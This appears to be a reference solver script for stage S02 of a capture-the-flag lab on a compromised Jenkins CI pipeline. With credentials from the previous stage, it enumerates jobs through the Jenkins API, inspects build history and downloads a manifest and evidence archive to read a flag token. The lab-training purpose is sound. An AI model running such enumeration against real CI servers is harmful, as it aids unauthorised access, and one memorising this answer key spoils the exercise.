
#!/usr/bin/env bash
# S02 - Pipeline Breach
# Reference solver for the intended solution path.
# Authorized use only inside the isolated Operation Poisoned Pipeline lab.

set -euo pipefail

JENKINS_URL="${JENKINS_URL:-https://10.13.10.20/jenkins}"
JENKINS_USER="${JENKINS_USER:-}"
JENKINS_PASS="${JENKINS_PASS:-}"
JOB_NAME="${JOB_NAME:-nexora-release}"
WORK_DIR="${1:-/tmp/s02-solve}"

if [[ -z "${JENKINS_USER}" || -z "${JENKINS_PASS}" ]]; then
    echo "[ERROR] JENKINS_USER and JENKINS_PASS must be set from the S01 handoff."
    exit 1
fi

echo "======================================================"
echo " S02 - Pipeline Breach Solver"
echo "======================================================"
echo

# Create the working directory without deleting existing files.
mkdir -p "${WORK_DIR}"

AUTH="${JENKINS_USER}:${JENKINS_PASS}"

echo "[1] Authenticating to Jenkins..."

CODE="$(curl -kfsS -u "${AUTH}" \
    -o /dev/null \
    -w '%{http_code}' \
    "${JENKINS_URL}/api/json" 2>/dev/null || true)"

if [[ "${CODE}" != "200" ]]; then
    echo "[ERROR] Jenkins authentication failed (HTTP ${CODE})."
    exit 1
fi

echo "    PASS: authenticated."

echo
echo "[2] Enumerating accessible jobs..."

curl -gkfsS -u "${AUTH}" \
    "${JENKINS_URL}/api/json?tree=jobs[name,url]" \
    | jq -r '.jobs[] | "\(.name)"'

echo
echo "[3] Inspecting build history for ${JOB_NAME}..."

curl -gkfsS -u "${AUTH}" \
    "${JENKINS_URL}/job/${JOB_NAME}/api/json?tree=builds[number,result,artifacts[fileName]]" \
    | jq

echo
echo "[4] Retrieving build history details..."

for BUILD in 101 102 103 104; do
    echo "--- Build #${BUILD} ---"

    curl -gkfsS -u "${AUTH}" \
        "${JENKINS_URL}/job/${JOB_NAME}/${BUILD}/api/json?tree=number,result,artifacts[fileName]" \
        | jq
done

echo
echo "[5] Downloading evidence from build #103..."

curl -kfsS -u "${AUTH}" \
    "${JENKINS_URL}/job/${JOB_NAME}/103/artifact/artifact-output/release-manifest.txt" \
    -o "${WORK_DIR}/release-manifest.txt"

curl -kfsS -u "${AUTH}" \
    "${JENKINS_URL}/job/${JOB_NAME}/103/artifact/artifact-output/evidence-s03.zip" \
    -o "${WORK_DIR}/evidence-s03.zip"

echo
echo "    Manifest saved to ${WORK_DIR}/release-manifest.txt"
echo "    Evidence saved to ${WORK_DIR}/evidence-s03.zip"

echo
echo "[6] Reading S02 manifest..."

echo "    Manifest contents:"

grep -E "^(S02_TOKEN|NEXT_STAGE)" \
    "${WORK_DIR}/release-manifest.txt" || true

echo
echo "======================================================"
echo " S02 solve complete."
echo " Submit the S02 token to CTFd."
echo " Preserve evidence-s03.zip for S03."
echo "======================================================"
